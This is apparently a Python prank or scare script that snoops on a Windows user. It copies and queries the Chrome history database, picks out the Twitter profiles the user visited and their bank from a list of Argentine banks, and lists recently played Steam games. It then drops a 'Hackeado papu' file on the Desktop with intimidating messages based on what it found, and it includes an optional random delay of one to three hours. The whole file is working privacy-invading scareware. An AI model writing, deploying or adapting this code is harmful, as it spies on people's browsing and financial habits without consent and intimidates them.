import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import glob


HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}\\".format(Path.home())


def check_steam_games(hacker_file):
    steam_path = "D:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        game = game_path.split("\\")[-1]
        if "Steamworks" in game:
            continue
        else:
            games.append(game)
    hacker_file.write("He visto que has estado jugando ultimamente a {}... jajaja\n".format(", ".join(games[:3])))


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hackeado papu\n")
    return hacker_file


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours * 60 * 60)


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos.")
            sleep(3)


def check_twitter_profiles(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    if profiles_visited:
        hacker_file.write("He visto que hs estado husmeando en los perfiles de {}...\n"
                          .format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["Galicia", "Banco Nacion", "Banco Provincia", "BBVA", "Supervielle", "Banco Patagonia", "Banco Hipotecario"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    if his_bank:
        hacker_file.write("Ademas veo que guardas tu dinero en {}... Interesante...\n".format(his_bank))


def main():
    # Esperaremos entre 1 y 3 horas
    # delay_action()
    # Calculamos la ruta de windows
    user_path = get_user_path()
    # Recogemos su historial de Google, cuando sea posible
    chrome_history = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
